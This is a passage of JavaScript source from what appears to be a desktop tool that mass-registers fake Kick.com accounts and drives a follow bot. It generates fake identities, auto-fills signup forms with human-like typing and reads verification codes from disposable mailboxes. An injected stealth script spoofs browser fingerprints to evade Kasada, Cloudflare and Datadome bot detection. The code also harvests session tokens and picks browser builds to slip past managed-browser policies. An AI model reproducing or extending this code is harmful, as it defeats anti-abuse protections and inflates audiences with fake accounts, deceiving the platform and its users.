  'mystic','urban','smoky','crimson','obsidian','radiant','feral','rogue','prime','luna',
];
const KAC_NOUN = [
  'fox','wolf','tiger','eagle','panda','dragon','knight','rider','hunter','viper',
  'phoenix','falcon','raven','shark','ninja','hawk','lynx','bear','lion','wizard',
  'storm','blade','rebel','samurai','outlaw','prophet','reaper','specter','sorcerer','titan',
  'rogue','warlord','warden','ghost','demon','goblin','warlock','assassin','beast','phantom',
];
const KAC_FIRSTS = [
  'mike','alex','jake','sam','chris','ryan','jordan','taylor','casey','morgan',
  'jamie','kyle','leo','max','noah','liam','kai','eli','ash','rex',
  'finn','theo','cole','zane','ace','dean','reed','tate','jett','wes',
  'kane','rio','ezra','kit','knox','reid',
];
const KAC_PREFIX = [
  'the','da','mr','big','lil','real','thee','official','iam','its',
  'sir','lord','captain','dr','mc','xx','yo','tha',
];

function kacRngInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function kacRngPick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function kacChance(p) { return Math.random() < p; }

function kacRandomLocalPart() {
  return kacRngPick(KAC_ADJ) + kacRngPick(KAC_NOUN) + kacRngInt(1000, 99999);
}

// 10 different naming templates — picks one at random, never feels canned.
function kacRandomKickUsername() {
  const t = [
    // Two-word with separator + digits (the original)
    () => kacRngPick(KAC_ADJ) + '_' + kacRngPick(KAC_NOUN) + kacRngInt(10, 9999),
    // Two-word smashed together + small digits
    () => kacRngPick(KAC_ADJ) + kacRngPick(KAC_NOUN) + kacRngInt(1, 99),
    // Noun first, adjective second
    () => kacRngPick(KAC_NOUN) + '_' + kacRngPick(KAC_ADJ) + kacRngInt(1, 999),
    // First-name based — most natural-looking
    () => kacRngPick(KAC_FIRSTS) + kacRngInt(100, 9999),
    () => kacRngPick(KAC_FIRSTS) + '_' + kacRngPick(KAC_NOUN) + kacRngInt(1, 99),
    () => kacRngPick(KAC_FIRSTS) + '_' + kacRngPick(KAC_FIRSTS),
    // Prefix-based ("the_max", "real_dragon")
    () => kacRngPick(KAC_PREFIX) + '_' + kacRngPick(KAC_FIRSTS),
    () => kacRngPick(KAC_PREFIX) + kacRngPick(KAC_NOUN) + kacRngInt(1, 999),
    // "Twitch-style" — usually with a tv/yt suffix
    () => kacRngPick(KAC_FIRSTS) + (kacChance(0.5) ? 'tv' : 'live') + kacRngInt(1, 99),
    // X-separator
    () => kacRngPick(KAC_ADJ) + 'x' + kacRngPick(KAC_NOUN) + (kacChance(0.5) ? kacRngInt(1, 99) : ''),
    // Just one noun + digits (clean & short)
    () => kacRngPick(KAC_NOUN) + kacRngInt(100, 9999),
  ];
  const name = t[Math.floor(Math.random() * t.length)]();
  // Kick allows 3-25 chars, letters/digits/underscore — sanitize defensively
  return String(name).toLowerCase().replace(/[^a-z0-9_]/g, '').slice(0, 25);
}

// Build a list of N distinct candidate usernames — the extension tries them
// in order, retrying when Kick says one is taken.
function kacRandomUsernameList(n) {
  const set = new Set();
  while (set.size < n) {
    const u = kacRandomKickUsername();
    if (u.length >= 4) set.add(u);
  }
  return Array.from(set);
}
function kacRandomPassword(len = 14) {
  // Kick requires upper + lower + digit + a special char. We use only the
  // safest symbols (@ # $ ! &) which are universally accepted and don't
  // need URL-encoding when saved/passed around.
  const lower = 'abcdefghijklmnopqrstuvwxyz';
  const upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const digit = '0123456789';
  const sym   = '@#$!&';
  const all   = lower + upper + digit + sym;
  // Guarantee one of each required class
  let p = kacRngPick(upper) + kacRngPick(lower) + kacRngPick(digit) + kacRngPick(sym);
  for (let i = p.length; i < len; i++) p += kacRngPick(all);
  // Shuffle so the guaranteed chars aren't always at the start
  return p.split('').sort(() => Math.random() - 0.5).join('');
}
function kacRandomBirthday() {
  // Age range 22–35
  const year  = new Date().getFullYear() - kacRngInt(22, 35);
  const month = kacRngInt(1, 12);
  const day   = kacRngInt(1, 28);
  const mm = String(month).padStart(2, '0');
  const dd = String(day).padStart(2, '0');
  return {
    year, month, day,
    iso:  `${year}-${mm}-${dd}`,                       // for type=date
    usa:  `${mm}/${dd}/${year}`,                       // human-readable
  };
}

const kacSleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── Event emitter to renderer ─────────────────────────────────────────────────
function kacEmit(channel, data) {
  if (mainWin && !mainWin.isDestroyed()) {
    mainWin.webContents.send(channel, data);
  }
}
function kacLog(msg, type = 'info') {
  kacEmit('kick-creator-progress', { step: 'log', msg, type, t: Date.now() });
}

// ── Persist to file ───────────────────────────────────────────────────────────
function kacAppendFile(email, password, token) {
  try {
    fs.appendFileSync(KAC.out, `${email}:${password}:${token}\n`, 'utf8');
  } catch (e) {
    console.warn('[KAC] file write failed:', e.message);
  }
}

// ── The in-page filler script — injected into the Kick signup window ──────────
// Returns a JSON-stringified status object so the main process can react.
function kacBuildFillScript(creds) {
  // creds = { email, password, kickUsername, birthdayIso, birthdayUsa, subscribe }
  return `
(async function() {
  function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
  function rand(min,max){ return min + Math.random()*(max-min); }
  function visible(el) {
    if (!el) return false;
    const r = el.getBoundingClientRect();
    if (r.width === 0 || r.height === 0) return false;
    const cs = getComputedStyle(el);
    return cs.display !== 'none' && cs.visibility !== 'hidden' && cs.opacity !== '0';
  }
  function fire(el, types) {
    for (const t of types) el.dispatchEvent(new Event(t, {bubbles:true}));
  }
  function setNative(el, value) {
    const proto = el.tagName === 'TEXTAREA'
      ? window.HTMLTextAreaElement.prototype
      : window.HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, 'value');
    desc && desc.set && desc.set.call(el, value);
  }
  async function humanType(el, value) {
    el.focus();
    setNative(el, '');
    fire(el, ['input','change']);
    for (const ch of value) {
      const current = el.value + ch;
      setNative(el, current);
      el.dispatchEvent(new InputEvent('input', { bubbles:true, data: ch, inputType:'insertText' }));
      el.dispatchEvent(new KeyboardEvent('keydown', { bubbles:true, key: ch }));
      el.dispatchEvent(new KeyboardEvent('keyup',   { bubbles:true, key: ch }));
      await sleep(rand(45, 110));
    }
    fire(el, ['change','blur']);
  }
  function findVisibleInput(predicates) {
    const inputs = Array.from(document.querySelectorAll('input, textarea')).filter(visible);
    for (const p of predicates) {
      const hit = inputs.find(p);
      if (hit) return hit;
    }
    return null;
  }
  function findClickable(rx) {
    const els = Array.from(document.querySelectorAll('button, [role="button"], a, [role="tab"], div[class*="signup" i], div[class*="register" i]'));
    return els.filter(visible).find(el => rx.test((el.textContent || '').trim().replace(/\\s+/g,' ')));
  }
  async function waitFor(predicate, timeoutMs, pollMs) {
    const t0 = Date.now();
    while (Date.now() - t0 < timeoutMs) {
      const v = predicate();
      if (v) return v;
      await sleep(pollMs || 250);
    }
    return null;
  }

  try {
    // ── 1. Reach the sign-up form ────────────────────────────────────────────
    // Kick.com landing page does NOT render the signup form by default; we
    // must open the auth modal first by clicking a "Sign Up" / "Register"
    // button (the header CTA), then optionally switch to the Sign Up tab if
    // the modal opens on Log In.
    let emailEl = findVisibleInput([
      i => i.type === 'email',
      i => /email/i.test((i.name||'') + (i.id||'') + (i.placeholder||'')),
    ]);

    if (!emailEl) {
      // Try each opener strategy in sequence
      const openerLabels = [
        /^sign\\s*up$/i,
        /^register$/i,
        /^create\\s+account$/i,
        /^get\\s+started$/i,
        /^join$/i,
      ];
      let opened = false;
      for (const rx of openerLabels) {
        const btn = findClickable(rx);
        if (btn) {
          btn.click();
          opened = true;
          await sleep(700);
          // After opening, give the modal a moment to mount
          emailEl = await waitFor(() => findVisibleInput([
            i => i.type === 'email',
            i => /email/i.test((i.name||'') + (i.id||'') + (i.placeholder||'')),
          ]), 5000, 200);
          if (emailEl) break;
        }
      }
      if (!emailEl && !opened) {
        // Last resort — navigate directly
        try { window.location.href = 'https://kick.com/login'; } catch(_) {}
        await sleep(2500);
      }
    }

    // If the modal opened on Log In, switch to Sign Up tab
    if (!emailEl) {
      const tab = findClickable(/^sign\\s*up$/i);
      if (tab) { tab.click(); await sleep(500); }
      emailEl = await waitFor(() => findVisibleInput([
        i => i.type === 'email',
        i => /email/i.test((i.name||'') + (i.id||'') + (i.placeholder||'')),
      ]), 6000, 250);
    }

    if (!emailEl) {
      // Dump a snapshot to help debugging
      const snap = Array.from(document.querySelectorAll('input'))
        .slice(0, 20)
        .map(i => ({ type:i.type, name:i.name, id:i.id, ph:i.placeholder, visible:visible(i) }));
      return JSON.stringify({ ok:false, step:'email', reason:'email input not found', snapshot:snap });
    }

    // ── 2. Email ─────────────────────────────────────────────────────────────
    await humanType(emailEl, ${JSON.stringify(creds.email)});
    await sleep(rand(250, 500));

    // ── 3. Birthday ──────────────────────────────────────────────────────────
    const dateEl = findVisibleInput([
      i => i.type === 'date',
      i => /birth|dob/i.test((i.name||'') + (i.id||'') + (i.placeholder||'')),
      i => /(MM\\/DD|YYYY)/i.test(i.placeholder || ''),
    ]);
    if (dateEl) {
      if (dateEl.type === 'date') {
        setNative(dateEl, ${JSON.stringify(creds.birthdayIso)});
        fire(dateEl, ['input','change','blur']);
      } else {
        await humanType(dateEl, ${JSON.stringify(creds.birthdayUsa)});
      }
      await sleep(rand(250, 500));
    }

    // ── 4. Username ──────────────────────────────────────────────────────────
    const userEl = findVisibleInput([
      i => /username/i.test((i.name||'') + (i.id||'') + (i.placeholder||'')),
      i => i.type === 'text' && i !== dateEl && i !== emailEl,
    ]);
    if (!userEl) return JSON.stringify({ ok:false, step:'username', reason:'username input not found' });
    await humanType(userEl, ${JSON.stringify(creds.kickUsername)});
    await sleep(rand(250, 500));

    // ── 5. Password ──────────────────────────────────────────────────────────
    const passEl = findVisibleInput([
      i => i.type === 'password',
      i => /password|pwd|passwd/i.test((i.name||'') + (i.id||'')),
    ]);
    if (!passEl) return JSON.stringify({ ok:false, step:'password', reason:'password input not found' });
    await humanType(passEl, ${JSON.stringify(creds.password)});
    await sleep(rand(350, 600));

    // ── 6. Newsletter checkbox (optional) ────────────────────────────────────
    const nlEl = findVisibleInput([
      i => i.type === 'checkbox' && /(news|promo|subscribe)/i.test(
        (i.name||'') + (i.id||'') +
        (i.closest('label') ? i.closest('label').textContent : '')
      ),
    ]);
    if (nlEl && nlEl.checked !== ${creds.subscribe ? 'true' : 'false'}) {
      nlEl.click();
      await sleep(rand(120, 250));
    }

    // ── 7. Submit ────────────────────────────────────────────────────────────
    // The Sign Up submit button is usually the one inside the same form as
    // the password field. Prefer that over any nav-bar "Sign Up" link.
    let submit = null;
    const form = passEl.closest('form');
    if (form) {
      submit = Array.from(form.querySelectorAll('button, [role="button"]'))
        .filter(visible)
        .find(b => /sign\\s*up|register|create|continue/i.test((b.textContent||'').trim()));
      if (!submit) submit = form.querySelector('button[type="submit"]');
    }
    if (!submit) {
      submit = Array.from(document.querySelectorAll('button[type="submit"]')).find(visible)
            || findClickable(/^(sign\\s*up|create\\s+account|register|continue)$/i);
    }
    if (!submit) return JSON.stringify({ ok:false, step:'submit', reason:'submit button not found' });
    submit.click();

    return JSON.stringify({ ok:true });
  } catch (e) {
    return JSON.stringify({ ok:false, step:'exception', reason: String(e && e.message || e) });
  }
})()
  `;
}

// ── Verification-code injector ────────────────────────────────────────────────
function kacBuildCodeInjectScript(code) {
  return `
(async function() {
  function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
  function setNative(el, value) {
    const desc = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value');
    desc && desc.set && desc.set.call(el, value);
  }
  function fire(el, types) {
    for (const t of types) el.dispatchEvent(new Event(t, {bubbles:true}));
  }
  const code = ${JSON.stringify(String(code))};

  // Strategy A: single input that takes the full code
  const single = Array.from(document.querySelectorAll('input')).find(i =>
    (i.maxLength && i.maxLength === code.length) ||
    /code|verif|otp/i.test((i.name||'') + (i.id||'') + (i.placeholder||''))
  );
  if (single) {
    single.focus();
    setNative(single, '');
    fire(single, ['input']);
    for (const ch of code) {
      setNative(single, single.value + ch);
      single.dispatchEvent(new InputEvent('input', { bubbles:true, data: ch, inputType:'insertText' }));
      await sleep(60);
    }
    fire(single, ['change','blur']);
    return JSON.stringify({ ok:true, mode:'single' });
  }

  // Strategy B: N single-char inputs (one per digit)
  const cells = Array.from(document.querySelectorAll('input'))
    .filter(i => i.maxLength === 1 && /^(text|tel|number)$/i.test(i.type));
  if (cells.length >= code.length) {
    for (let i = 0; i < code.length; i++) {
      const el = cells[i];
      el.focus();
      setNative(el, code[i]);
      el.dispatchEvent(new InputEvent('input', { bubbles:true, data: code[i], inputType:'insertText' }));
      fire(el, ['change']);
      await sleep(80);
    }
    return JSON.stringify({ ok:true, mode:'cells', cells: cells.length });
  }

  return JSON.stringify({ ok:false, reason:'no code input found' });
})()
  `;
}

// ── Extract a 4–8 digit code from a temp-mail message ─────────────────────────
// Works with both mail.tm format (text/html) and 1secmail format
// (textBody/htmlBody/body).
function kacExtractCode(message) {
  if (!message) return null;
  const parts = [
    message.text, message.textBody,
    message.html, message.htmlBody, message.body,
    message.subject,
  ];
  const text = parts
    .map((p) => Array.isArray(p) ? p.join('\n') : (p || ''))
    .join('\n')
    .replace(/<[^>]+>/g, ' ');
  const m = text.match(/\b(\d{4,8})\b/);
  return m ? m[1] : null;
}

// ── Poll mail.tm until a Kick verification email arrives or timeout ───────────
async function kacPollForCode(mailToken, timeoutMs = 90000) {
  const started = Date.now();
  let lastSeen = new Set();
  while (Date.now() - started < timeoutMs) {
    if (KAC.abort) return null;
    let messages = [];
    try { messages = await kacMailListMessages(mailToken); } catch (_) {}
    for (const m of messages) {
      if (lastSeen.has(m.id)) continue;
      lastSeen.add(m.id);
      const full = await kacMailGetMessage(mailToken, m.id);
      const code = kacExtractCode(full);
      if (code) return code;
    }
    await kacSleep(3000);
  }
  return null;
}

// ── Stealth init-script — runs BEFORE any page JS, hides automation traces ───
// Targets every cheap detection Kasada / Cloudflare / Datadome typically use.
const KAC_STEALTH = `
(() => {
  try {
    // 1. navigator.webdriver
    Object.defineProperty(Navigator.prototype, 'webdriver', { get: () => false, configurable: true });
  } catch (_) {}
  try {
    // 2. Chrome runtime
    if (!window.chrome) window.chrome = {};
    if (!window.chrome.runtime) window.chrome.runtime = { id: undefined, OnInstalledReason: {}, OnRestartRequiredReason: {} };
  } catch (_) {}
  try {
    // 3. Plugins / mime types — empty array is a tell
    Object.defineProperty(Navigator.prototype, 'plugins', { get: () => {
      const arr = [
        { name: 'PDF Viewer',          filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
        { name: 'Chrome PDF Viewer',   filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
        { name: 'Chromium PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
        { name: 'Microsoft Edge PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
        { name: 'WebKit built-in PDF', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
      ];
      arr.item = (i) => arr[i] || null;
      arr.namedItem = (n) => arr.find(p => p.name === n) || null;
      arr.refresh = () => {};
      return arr;
    }});
  } catch (_) {}
  try {
    // 4. Languages
    Object.defineProperty(Navigator.prototype, 'languages', { get: () => ['en-US', 'en'] });
  } catch (_) {}
  try {
    // 5. Permissions.query — "notifications" leak
    const origQuery = window.navigator.permissions && window.navigator.permissions.query;
    if (origQuery) {
      window.navigator.permissions.query = (params) =>
        params && params.name === 'notifications'
          ? Promise.resolve({ state: Notification.permission, onchange: null })
          : origQuery.call(window.navigator.permissions, params);
    }
  } catch (_) {}
  try {
    // 6. WebGL vendor/renderer — Kasada checks these
    const getParam = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function (p) {
      if (p === 37445) return 'Intel Inc.';
      if (p === 37446) return 'Intel Iris OpenGL Engine';
      return getParam.call(this, p);
    };
  } catch (_) {}
  try {
    // 7. iframe contentWindow.chrome — CDP detection
    const origContentWindow = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'contentWindow');
    if (origContentWindow && origContentWindow.get) {
      Object.defineProperty(HTMLIFrameElement.prototype, 'contentWindow', {
        get() { const w = origContentWindow.get.call(this); try { if (w && !w.chrome) w.chrome = window.chrome; } catch(_){} return w; }
      });
    }
  } catch (_) {}
  try {
    // 8. Hardware concurrency + device memory
    Object.defineProperty(Navigator.prototype, 'hardwareConcurrency', { get: () => 8 });
    Object.defineProperty(Navigator.prototype, 'deviceMemory',        { get: () => 8 });
  } catch (_) {}
  try {
    // 9. CDC / webdriver string leaks on document / window
    for (const k of Object.keys(window)) {
      if (k.startsWith('cdc_') || k.startsWith('$cdc_') || k === '__webdriver_evaluate' || k === '__driver_evaluate') {
        try { delete window[k]; } catch (_) {}
      }
    }
  } catch (_) {}
})();
`;

// ── Wait for a Chrome remote-debug port to be reachable ──────────────────────
function kacWaitForDebugPort(port, timeoutMs = 15000) {
  const t0 = Date.now();
  return new Promise((resolve, reject) => {
    const tick = () => {
      http.get({ host: '127.0.0.1', port, path: '/json/version', timeout: 800 }, (res) => {
        let data = '';
        res.on('data', (c) => data += c);
        res.on('end', () => {
          try {
            const ver = JSON.parse(data || '{}');
            if (ver.webSocketDebuggerUrl) resolve(ver);
            else if (Date.now() - t0 > timeoutMs) reject(new Error('debugger never returned webSocketDebuggerUrl'));
            else setTimeout(tick, 250);
          } catch (e) {
            if (Date.now() - t0 > timeoutMs) reject(e);
            else setTimeout(tick, 250);
          }
        });
      }).on('error', () => {
        if (Date.now() - t0 > timeoutMs) reject(new Error('Chrome debug port unreachable on :' + port));
        else setTimeout(tick, 250);
      });
    };
    tick();
  });
}

// ── Find a free TCP port (random in 9200-9999) ────────────────────────────────
function kacRandomPort() { return 9200 + Math.floor(Math.random() * 700); }

// ── Find a real installed Chrome (same heuristic as the follow-bot) ──────────
// Locate the user's installed REAL chrome.exe — never Edge, never Chromium,
// never Electron. We try every standard install path Google ships to.
// Returns the absolute path or null. The chosen path is also exposed via
// console.log so it's visible in the launch terminal / DevTools.
function kacFindChrome() {
  const loc   = process.env.LOCALAPPDATA || '';
  const pf    = process.env['ProgramFiles']      || 'C:\\Program Files';
  const pf86  = process.env['ProgramFiles(x86)'] || 'C:\\Program Files (x86)';
  const home  = process.env.HOME || '';

  // ⭐ CHROME ONLY ⭐  (no Edge, no Chromium, no Brave)
  // Priority: Canary → Dev → Beta → Stable.
  // Why this order: enterprise/family-managed environments only push policies
  // to Stable; users who install Canary/Beta/Dev do so to escape those
  // policies (because managed Stable blocks --load-extension). If any of
  // those side-by-side channels exist, prefer them over Stable.
  const candidates = [
    // Windows — Canary / Dev / Beta (preferred when present)
    path.join(loc,  'Google\\Chrome SxS\\Application\\chrome.exe'),  // Canary
    path.join(pf,   'Google\\Chrome Dev\\Application\\chrome.exe'),
    path.join(pf86, 'Google\\Chrome Dev\\Application\\chrome.exe'),
    path.join(pf,   'Google\\Chrome Beta\\Application\\chrome.exe'),
    path.join(pf86, 'Google\\Chrome Beta\\Application\\chrome.exe'),
    // Windows — Chrome Stable (fallback)
    path.join(pf,   'Google\\Chrome\\Application\\chrome.exe'),
    path.join(pf86, 'Google\\Chrome\\Application\\chrome.exe'),
    path.join(loc,  'Google\\Chrome\\Application\\chrome.exe'),
    // macOS — Canary / Dev / Beta first, Stable last
    '/Applications/Google Chrome Canary.app/Contents/MacOS/Google Chrome Canary',
    '/Applications/Google Chrome Dev.app/Contents/MacOS/Google Chrome Dev',
    '/Applications/Google Chrome Beta.app/Contents/MacOS/Google Chrome Beta',
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
    home && path.join(home, 'Applications/Google Chrome.app/Contents/MacOS/Google Chrome'),
    // Linux
    '/usr/bin/google-chrome-unstable',  // Dev
    '/usr/bin/google-chrome-beta',
    '/usr/bin/google-chrome',
    '/usr/bin/google-chrome-stable',
    '/snap/bin/google-chrome',
    '/opt/google/chrome/chrome',
  ];

  for (const p of candidates) {
    try {
      if (p && fs.existsSync(p)) {
        console.log('[KAC] Real Chrome found at:', p);
        return p;
      }
    } catch (_) {}
  }
  console.warn('[KAC] No installed Chrome found at any standard path');
  return null;
}

// ── Find a real installed Firefox (any flavor — Stable, Developer, Nightly, ESR)
// Returns the path to firefox.exe / firefox binary on the host, or null if
// none is found. Used by the Follow Bot when the user selects Firefox as the
// browser. Developer Edition / Nightly are preferred because they allow
// sideloading unsigned WebExtensions via the xpinstall.signatures.required
// pref; stable Firefox blocks unsigned add-ons regardless of prefs.
function kacFindFirefox() {
  const loc   = process.env.LOCALAPPDATA || '';
  const pf    = process.env['ProgramFiles']      || 'C:\\Program Files';
  const pf86  = process.env['ProgramFiles(x86)'] || 'C:\\Program Files (x86)';
  const home  = process.env.HOME || '';

  const candidates = [
    // Windows — Developer Edition / Nightly first (allow unsigned add-ons)
    path.join(pf,   'Firefox Developer Edition\\firefox.exe'),
    path.join(pf86, 'Firefox Developer Edition\\firefox.exe'),
    path.join(pf,   'Firefox Nightly\\firefox.exe'),
    path.join(pf86, 'Firefox Nightly\\firefox.exe'),
    // Windows — ESR (also allows unsigned via enterprise policy / prefs)
    path.join(pf,   'Mozilla Firefox ESR\\firefox.exe'),
    path.join(pf86, 'Mozilla Firefox ESR\\firefox.exe'),
    // Windows — Stable (fallback; only works with signed XPIs)
    path.join(pf,   'Mozilla Firefox\\firefox.exe'),
    path.join(pf86, 'Mozilla Firefox\\firefox.exe'),
    path.join(loc,  'Mozilla Firefox\\firefox.exe'),
    // macOS
    '/Applications/Firefox Developer Edition.app/Contents/MacOS/firefox',
    '/Applications/Firefox Nightly.app/Contents/MacOS/firefox',
    '/Applications/Firefox.app/Contents/MacOS/firefox',
    home && path.join(home, 'Applications/Firefox.app/Contents/MacOS/firefox'),
    // Linux
    '/usr/bin/firefox-developer-edition',
    '/usr/bin/firefox-nightly',
    '/usr/bin/firefox',
    '/snap/bin/firefox',
    '/opt/firefox/firefox',
  ];

  for (const p of candidates) {
    try {
      if (p && fs.existsSync(p)) {
        console.log('[KAC] Firefox found at:', p);
        return p;
      }
    } catch (_) {}
  }
  console.warn('[KAC] No installed Firefox found at any standard path');
  return null;
}

// ── Extract Kick bearer token from a Playwright page ─────────────────────────
// Pending-account map: when Chrome spawns, we stash credentials here keyed by
// session id, so the renderer can later post the user-supplied token back and
// we know which mail.tm mailbox / email it belongs to.
const KAC_PENDING = new Map();
function kacNewSessionId() { return 'kac-' + Date.now() + '-' + Math.floor(Math.random() * 1e6); }

// ── Local HTTP server — bridge between FLT and the in-page extension ─────────
// The extension fetches /code?session=X to get the verification code, and
// POSTs /token to deliver the auth token after signup completes.
let _kacServer     = null;
let _kacServerPort = 0;
function kacStartServer() {
  if (_kacServer) return _kacServerPort;
  _kacServer = http.createServer((req, res) => {
    res.setHeader('access-control-allow-origin',  '*');
    res.setHeader('access-control-allow-headers', 'content-type');
    res.setHeader('access-control-allow-methods', 'GET, POST, OPTIONS');
    if (req.method === 'OPTIONS') { res.statusCode = 204; return res.end(); }

    const u = new URL(req.url, 'http://127.0.0.1');

    // GET /code?session=ID  → { code } or {}
    if (req.method === 'GET' && u.pathname === '/code') {
      const sid = u.searchParams.get('session');
      const p = sid ? KAC_PENDING.get(sid) : null;
      res.setHeader('content-type', 'application/json');
      return res.end(JSON.stringify(p && p.code ? { code: p.code } : {}));
    }

    // POST /username body: { session, username }       → updates pending username
    // POST /status   body: { session, status, url? }   → logs to FLT
    // POST /token    body: { session, token, url? }    → resolves session
    if (req.method === 'POST' && (u.pathname === '/status' || u.pathname === '/token' || u.pathname === '/username')) {
      let body = '';
      req.on('data', (c) => body += c);
      req.on('end', () => {
        let j = {};
        try { j = JSON.parse(body || '{}'); } catch (_) {}
        const sid = j.session;
        const p = sid ? KAC_PENDING.get(sid) : null;

        if (u.pathname === '/status') {
          if (p && j.status === 'loaded') p.heartbeat = Date.now();
          kacEmit('kick-creator-progress', {
            step: 'ext', type: j.status && /fail|error/i.test(j.status) ? 'err' : 'info',
            msg:  'Extension: ' + (j.status || '?') + (j.url ? '  · ' + j.url : ''),
          });
          res.statusCode = 204;
          return res.end();
        }

        if (u.pathname === '/username') {
          if (p && j.username && typeof j.username === 'string') {
            p.username = j.username;
            kacEmit('kick-creator-progress', {
              step: 'ext', type: 'ok',
              msg:  'Extension chose username: ' + j.username,
            });
          }
          res.statusCode = 204;
          return res.end();
        }

        // /token
        if (p && p.resolve && j.token && String(j.token).length > 20) {
          try { clearTimeout(p.timer); } catch (_) {}
          try { if (p.chromeProc) p.chromeProc.kill('SIGTERM'); } catch (_) {}
          KAC_PENDING.delete(sid);
          const cleanToken = String(j.token).replace(/^Bearer\s+/i, '');
          p.resolve({
            email:     p.email,
            password:  p.password,
            username:  p.username,
            token:     cleanToken,
            createdAt: Date.now(),
          });
          res.setHeader('content-type', 'application/json');
          return res.end('{"ok":true}');
        }
        res.statusCode = 400;
        res.end('{"ok":false}');
      });
      return;
    }

    // POST /follow-status body: { session, status, info?, url? }
    //   Used by the Follow Bot click-mode extension. On 'done' / 'fail' the
    //   pending FBC session is resolved with the result.
    if (req.method === 'POST' && u.pathname === '/follow-status') {
      let body = '';
      req.on('data', (c) => body += c);
      req.on('end', () => {
        let j = {};
        try { j = JSON.parse(body || '{}'); } catch (_) {}
        const sid = j.session;
        const p = sid ? FBC_PENDING.get(sid) : null;

        // First ping from the extension — silence the "never loaded" watchdog
        if (p) p.heartbeat = true;

        // Emit running status to the renderer for the log feed
        if (j.status !== 'done' && j.status !== 'fail') {
          fbcEmit('follow-clicker-progress', {
            step: 'ext', type: /fail|error/i.test(j.status || '') ? 'err' : 'info',
            msg:  'Ext: ' + (j.status || '?') + (j.url ? '  · ' + j.url : ''),
            sessionId: sid,
          });
        }

        // Terminal status — resolve the pending follow attempt
        if (p && p.resolve && (j.status === 'done' || j.status === 'fail')) {
          try { clearTimeout(p.timer); } catch (_) {}
          FBC_PENDING.delete(sid);
          p.resolve({
            success: j.status === 'done',
            info:    j.info || null,
          });
        }
        res.statusCode = 204;
        return res.end();
      });
      return;
    }

    res.statusCode = 404;
    res.end('not found');
  });
  // bind on a random free port, loopback only
  _kacServer.listen(0, '127.0.0.1', () => {
    _kacServerPort = _kacServer.address().port;
    console.log('[KAC] local bridge on http://127.0.0.1:' + _kacServerPort);
  });
  return 0; // port will be set on listen; caller should re-read after a tick
}
function kacServerOrigin() { return 'http://127.0.0.1:' + _kacServerPort; }

// ── Token extractor (runs inside the page) ────────────────────────────────────
async function kacExtractTokenFromPage(page) {
  try {
    const ctx = page.context();
    const allCookies = await ctx.cookies();
    const cookies = allCookies.filter((c) => /kick\.com$/.test(c.domain || ''));
    let bearerToken = null;
    try {
      bearerToken = await page.evaluate(() => {
        const keys = ['auth._token.local','auth._token.laravelPassport','auth._token.kick',
                      'token','auth_token','access_token'];
        for (const k of keys) {
          const v = localStorage.getItem(k);
          if (v && v.length > 10) return v.replace(/^Bearer\s+/i, '');
        }
        for (const k of Object.keys(localStorage)) {
          const v = localStorage.getItem(k);
          if (v && v.length > 20 && v.length < 800 &&
              (k.toLowerCase().includes('token') || k.toLowerCase().includes('auth'))) {
            return v.replace(/^Bearer\s+/i, '');
          }
        }
        return null;
      });
    } catch (_) {}
    return {
      bearerToken,
      cookies: cookies.map((c) => ({ name: c.name, value: c.value })),
    };
  } catch {
    return { bearerToken: null, cookies: [] };
  }
}

// ── "Unknown error" detector — scans the modal for Kick's red banner ─────────
async function kacIsKickRejecting(page) {
  try {
    return await page.evaluate(() => {
      const ERR_RX = /unknown\s+error|please\s+try\s+again|invalid|already\s+(been\s+)?taken|too\s+many|rate\s+limit/i;
      // Look at every visible banner-ish element near the form
      const candidates = Array.from(document.querySelectorAll('div, span, p, [role="alert"]'));
      for (const el of candidates) {
        const r = el.getBoundingClientRect();
        if (r.width === 0 || r.height === 0) continue;
        const txt = (el.textContent || '').trim();
        if (txt && txt.length < 200 && ERR_RX.test(txt)) return txt.slice(0, 160);
      }
      return null;
    });
  } catch { return null; }
}

// ── Form filler (Playwright-based) ───────────────────────────────────────────
async function kacFillFormOnPage(page, creds) {
  kacEmit('kick-creator-progress', { step: 'fill', msg: 'Looking for Sign Up button…' });
  const headerSignUp = page.locator(
    'button:has-text("Sign Up"), a:has-text("Sign Up")'
  ).first();
  try {
    await headerSignUp.waitFor({ state: 'visible', timeout: 15000 });
    await headerSignUp.click({ timeout: 5000 });
  } catch (_) {}

  try {
    const signUpTab = page.locator('[role="tab"]:has-text("Sign Up"), button:has-text("Sign Up"):not([type="submit"])').first();
    if (await signUpTab.isVisible({ timeout: 1500 }).catch(() => false)) {
      await signUpTab.click().catch(() => {});
    }
  } catch (_) {}

  // Email
  const emailInput = page.locator('input[type="email"], input[name*="email" i]').first();
  await emailInput.waitFor({ state: 'visible', timeout: 15000 });
  kacEmit('kick-creator-progress', { step: 'fill', msg: 'Typing email…' });
  await emailInput.click({ delay: 80 });
  await emailInput.fill('');
  await emailInput.type(creds.email, { delay: 70 });
  await page.waitForTimeout(300 + Math.random() * 250);

  // Birthday
  kacEmit('kick-creator-progress', { step: 'fill', msg: 'Typing birthday…' });
  const dateInput = page.locator('input[type="date"], input[name*="birth" i]').first();
  if (await dateInput.isVisible({ timeout: 2000 }).catch(() => false)) {
    const t = await dateInput.evaluate((el) => el.type);
    await dateInput.click({ delay: 80 });
    if (t === 'date') {
      await dateInput.fill(creds.birthdayIso);
      await dateInput.evaluate((el) => el.dispatchEvent(new Event('change', { bubbles: true })));
    } else {
      await dateInput.fill('');
      await dateInput.type(creds.birthdayUsa, { delay: 70 });
    }
    await page.waitForTimeout(300 + Math.random() * 250);
  }

  // Username
  kacEmit('kick-creator-progress', { step: 'fill', msg: 'Typing username…' });
  const userInput = page.locator('input[name*="user" i], input[placeholder*="user" i]').first();
